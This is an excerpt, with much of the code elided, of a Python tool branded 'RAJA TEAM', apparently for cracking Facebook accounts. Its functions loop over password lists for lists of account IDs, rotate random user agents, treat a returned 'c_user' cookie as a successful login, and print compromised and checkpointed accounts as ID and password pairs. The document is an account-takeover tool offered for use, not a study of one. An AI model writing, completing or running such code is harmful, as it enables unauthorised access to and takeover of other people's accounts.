...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> RAJA TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://www.facebook.com/Rk.modss/');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[RAJA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in RAJA:
				print('\r\r\033[1;31m[RAJA-CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[RAJA-OK] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in RAJA:
				...
				print('\r\r\033[1;32m[RAJA-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[RAJA-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mRAJA\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[RAJA-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[38;5;208m[RAJA-CP] '+cid+' | '+ps+'\33[0;97m')
